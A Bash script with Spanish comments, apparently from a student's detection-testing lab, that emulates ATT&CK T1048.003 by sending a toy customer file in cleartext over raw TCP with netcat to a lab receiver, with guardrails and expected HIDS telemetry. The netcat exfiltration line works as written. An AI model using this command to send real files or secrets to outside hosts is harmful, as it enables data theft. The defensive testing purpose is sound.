#!/usr/bin/env bash
# ============================================================================
# ATA042 · T1048.003 Unencrypted Non-C2 Protocol — ataque MANUAL (TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol (tactica
#           Exfiltration). Envio EN CLARO por un protocolo alternativo NO-C2
#           (TCP crudo al receptor local), para comparar con las variantes
#           cifradas (ATA019 simetrica, ATA041 asimetrica): el cifrado NO cambia
#           lo que ve el HIDS (es el proceso, no el contenido).
# Fuente  : custom (escrito por el TFG; ART trae pruebas Linux/manual)
# Objetivo: enviar un fichero de datos simulados SIN cifrar por TCP crudo.
# Destino : tcp://192.168.65.1:9091 (receptor del HOST, modo --tcp-port, VMnet1)
# Ejecuta : desde /home/angel/lab-attack/ATA042 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST con `--tcp-port 9091` antes de t0 (ver README §9).
#    La prueba de que el dato SALIO es la linea `TCP ... sha256=<H>` del `sink.log`
#    con <H> == sha256 del fichero EN CLARO enviado.
#
# ⚠️ BINARIO REAL (paso 0): `nc` es un enlace -> /usr/bin/nc.openbsd. El `execve`
#    registra `/usr/bin/nc.openbsd` (declarar el nombre REAL, no `nc`).
#
# GUARDARRAILES (abortan si no se cumplen):
#   - el destino DEBE ser 192.168.65.1:9091 (receptor del laboratorio);
#   - solo se escribe en $HOME/lab-attack/ATA042; datos de juguete.
#
# Telemetria esperada (ver README §5):
#   - execve de nc.openbsd (envio en claro del dato) -> 80792 (deteccion; T1048.003-S1).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA042/*` (T1048.003-S2).
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA042"
PLAIN="${BASE}/extracto_clientes_2026.txt"
HOST="192.168.65.1"
TCP_PORT="9091"

echo "ATA042 · T1048.003 Unencrypted Non-C2 (nc.openbsd, TCP crudo en claro) — custom"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
for t in nc.openbsd sha256sum awk; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "ERROR: $t no disponible" >&2
    exit 1
  fi
done

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el receptor TCP del laboratorio (VMnet1 del host).
if [ "$HOST" != "192.168.65.1" ] || [ "$TCP_PORT" != "9091" ]; then
  echo "ERROR: destino '$HOST:$TCP_PORT' fuera del receptor del laboratorio (abortado)" >&2
  exit 1
fi

# 0) SIEMBRA del dato a exfiltrar (datos de juguete; builtin printf -> sin execve).
if [ ! -f "$PLAIN" ]; then
  {
    printf 'cliente,nif,segmento,facturacion_eur\n'
    printf 'Acme Iberica,B12345678,empresa,182340.50\n'
    printf 'Mallory Consulting SL,B87654321,empresa,91200.00\n'
    printf 'Logistica Norte SL,B11223344,empresa,45310.75\n'
  } > "$PLAIN"
fi

echo "--- FICHERO EN CLARO (a enviar) ---"
sha256sum "$PLAIN"
echo "bytes_original=$(stat -c %s "$PLAIN")"

# 1) ENVIO EN CLARO por TCP CRUDO (execve de nc.openbsd; -N cierra el socket tras EOF).
nc.openbsd -N -w 5 "$HOST" "$TCP_PORT" < "$PLAIN"

# 2) PRUEBA DE EFECTO (local): sha256 del fichero EN CLARO realmente enviado.
s_plain=$(sha256sum "$PLAIN" | awk '{print $1}')
echo "sha256 enviado (claro) = $s_plain"

echo "--- estado final ---"
ls -l "$PLAIN"
if [ -n "$s_plain" ]; then
  echo "EXFIL_EN_CLARO=OK (dato sin cifrar enviado por TCP crudo ${HOST}:${TCP_PORT})"
else
  echo "EXFIL_EN_CLARO=FALLO" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
